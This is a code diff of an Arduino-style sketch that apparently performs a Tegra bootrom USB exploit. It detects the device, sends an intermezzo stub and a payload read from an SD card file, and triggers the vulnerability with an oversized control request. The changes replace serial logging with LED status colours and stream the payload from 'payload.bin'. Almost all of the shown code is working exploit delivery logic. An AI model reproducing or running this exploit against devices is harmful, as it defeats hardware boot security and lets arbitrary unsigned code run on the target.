@@ -1,8 +1,8 @@
-#include <Arduino.h>
-#include <usb.h>
-
-// Contains fuseeBin and FUSEE_BIN_LENGTH
-#include "payload.h"
+//#include <Arduino.h>
+#include <Usb.h>
+#include <SPI.h>
+#include <SD.h>
+#include <Adafruit_DotStar.h>
 
 #define INTERMEZZO_SIZE 92
 const byte intermezzo[INTERMEZZO_SIZE] =
@@ -29,6 +29,37 @@ byte tegraDeviceAddress = -1;
 
 unsigned long lastCheckTime = 0;
 
+#define DATAPIN   7
+#define CLOCKPIN   8
+
+Adafruit_DotStar strip = Adafruit_DotStar(1, DATAPIN, CLOCKPIN, DOTSTAR_BGR);
+
+File payloadFile;
+#define COLOUR_NO_SD      0xFF0000
+#define COLOUR_NO_PAYLOAD 0xFFFF00
+#define COLOUR_USB_FAIL   0xFF00FF
+#define COLOUR_WAIT_USB   0x00FF00
+#define COLOUR_FOUND_USB  0xFF00FF
+#define COLOUR_DONE       0x0000FF
+
+void doColour(uint32_t colour)
+{
+    strip.setPixelColor(0, colour);
+    strip.show();
+}
+
+void halt(int colour)
+{
+  while(1)
+  {
+    doColour(colour);
+    delay(500);
+    doColour(0x000000);
+    delay(500);
+  }
+}
+
+
 const char *hexChars = "0123456789ABCDEF";
 void serialPrintHex(const byte *data, byte length)
 {
@@ -49,10 +80,10 @@ void usbOutTransferChunk(uint32_t addr, uint32_t ep, uint32_t nbytes, uint8_t* d
 
     usb_pipe_table[epInfo->epAddr].HostDescBank[0].CTRL_PIPE.bit.PDADDR = addr;
 
-	if (epInfo->bmSndToggle)
-		USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
-	else
-		USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;
+    if (epInfo->bmSndToggle)
+      USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
+    else
+      USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;
 
     UHD_Pipe_Write(epInfo->epAddr, PACKET_CHUNK_SIZE, data);
     uint32_t rcode = usb.dispatchPkt(tokOUT, epInfo->epAddr, 15);
@@ -68,7 +99,8 @@ void usbOutTransferChunk(uint32_t addr, uint32_t ep, uint32_t nbytes, uint8_t* d
         }
         else
         {
-            Serial.println("Error in OUT transfer");
+            halt(COLOUR_USB_FAIL);
+//            Serial.println("Error in OUT transfer");
             return;
         }
     }
@@ -117,12 +149,16 @@ void readTegraDeviceID(byte *deviceID)
     UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);
 
     if (usb.inTransfer(tegraDeviceAddress, 0x01, &readLength, deviceID))
+    {
         Serial.println("Failed to get device ID!");
+    }
 }
 
-void sendPayload(const byte *payload, uint32_t payloadLength)
+void sendPayload()
 {
-    byte zeros[0x1000] = {0};
+    byte zeros[PACKET_CHUNK_SIZE] = {0};
+    uint32_t payloadLen = payloadFile.size();
+    uint32_t dataLen;
 
     usbBufferedWriteU32(0x30298);
     usbBufferedWrite(zeros, 680 - 4);
@@ -132,7 +168,13 @@ void sendPayload(const byte *payload, uint32_t payloadLength)
 
     usbBufferedWrite(intermezzo, INTERMEZZO_SIZE);
     usbBufferedWrite(zeros, 0xFA4);
-    usbBufferedWrite(payload, payloadLength);
+    while (payloadLen > 0)
+    {
+        dataLen = min(PACKET_CHUNK_SIZE, payloadLen);
+        payloadFile.read(zeros, dataLen);
+        usbBufferedWrite(zeros, dataLen);
+        payloadLen -= dataLen;
+    }    
     usbFlushBuffer();
 }
 
@@ -142,7 +184,7 @@ void findTegraDevice(UsbDeviceDefinition *pdev)
     USB_DEVICE_DESCRIPTOR deviceDescriptor;
     if (usb.getDevDescr(address, 0, 0x12, (uint8_t *)&deviceDescriptor))
     {
-        Serial.println("Error getting device descriptor.");
+        //Serial.println("Error getting device descriptor.");
         return;
     }
 
@@ -176,49 +218,66 @@ void setupTegraDevice()
     UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);
 }
 
+
+
+
 void setup()
 {
     usb.Init();
     Serial.begin(115200);
-
     delay(100);
 
-    Serial.println("Ready! Waiting for Tegra...");
-
+    strip.begin();
+    doColour(0x000000);
+    
+    if (!SD.begin(1)) // chip select is actually hardwired but the lib needs something, so 1 is used for now
+    {
+        halt(COLOUR_NO_SD);
+    }
+    
+    payloadFile = SD.open("payload.bin", FILE_READ);
+    if (!payloadFile)
+    {
+        halt(COLOUR_NO_PAYLOAD);
+    }
+    
+    int waitColour = COLOUR_WAIT_USB;
     while (!foundTegra)
     {
         usb.Task();
 
         if (millis() > lastCheckTime + 100)
+        {
             usb.ForEachUsbDevice(&findTegraDevice);
+            doColour(waitColour);
+            waitColour = COLOUR_WAIT_USB - waitColour;
+            lastCheckTime = millis();
+        }
     }
 
-    Serial.println("Found Tegra!");
+    doColour(COLOUR_FOUND_USB);
     setupTegraDevice();
 
     byte deviceID[16] = {0};
     readTegraDeviceID(deviceID);
-    Serial.print("Device ID: ");
     serialPrintHex(deviceID, 16);
-
-    Serial.println("Sending payload...");
+    
     UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_OUT, 0x40, 0, USB_HOST_NB_BK_1);
     packetsWritten = 0;
-    sendPayload(fuseeBin, FUSEE_BIN_SIZE);
+    sendPayload();
 
     if (packetsWritten % 2 != 1)
     {
-        Serial.println("Switching to higher buffer...");
         usbFlushBuffer();
     }
 
-    Serial.println("Triggering vulnerability...");
     usb.ctrlReq(tegraDeviceAddress, 0, USB_SETUP_DEVICE_TO_HOST | USB_SETUP_TYPE_STANDARD | USB_SETUP_RECIPIENT_INTERFACE,
         0x00, 0x00, 0x00, 0x00, 0x7000, 0x7000, usbWriteBuffer, NULL);
-    Serial.println("Done!");
+    doColour(COLOUR_DONE);
 
     // Turn off all LEDs and go to sleep. To launch another payload, press the reset button on the device.
-    delay(100);
+    delay(500);
+    doColour(0);
     digitalWrite(PIN_LED_RXL, HIGH);
     digitalWrite(PIN_LED_TXL, HIGH);
     digitalWrite(13, LOW);
